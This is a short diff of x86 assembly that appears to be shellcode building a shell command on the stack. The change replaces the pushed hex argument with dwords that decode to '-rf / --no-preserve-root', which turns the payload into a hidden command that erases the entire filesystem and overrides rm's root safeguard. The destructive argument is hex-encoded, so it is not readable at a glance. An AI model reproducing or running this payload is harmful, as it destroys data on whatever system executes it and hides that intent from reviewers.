@@ -15,8 +15,12 @@ _start:
     mov ebx, esp            ;move pointer to command into ebx
 
     push eax                ;push null eax register to the stack
-    push 0x2f2f2f2f
-    push 0x7666722d         ;push argument to the stack "-rf"
+    push 0x746f6f72
+    push 0x2d657672    
+    push 0x65736572
+    push 0x702d6f6e
+    push 0x2d2d202f
+    push 0x2066722d     
     
     mov esi, esp            ;move stack pointer to esi
 
